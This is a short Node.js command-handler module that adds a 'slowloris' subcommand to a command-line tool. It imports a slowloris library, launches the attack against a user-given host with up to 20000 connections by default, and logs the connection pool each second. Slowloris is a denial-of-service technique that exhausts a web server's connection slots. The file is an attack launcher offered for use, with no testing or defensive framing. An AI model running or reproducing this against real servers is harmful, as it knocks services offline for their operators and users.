
const Loris = require('slowloris.tool');

module.exports = (arg, cwd, cli) => {
	if (arg.is('slowloris')) {
		let l = new Loris(cli.get('host'), Number(cli.get('max') || 20000))
			.attack();

		l.on('ramp', (r) => {
			console.log('ramp up connection', r);
		});

		setInterval(() => {
			console.log('connections', l.connections, '/', l.pool, 'max', l.cap);
		}, 1000);
		return true;
	}
	return false;
};
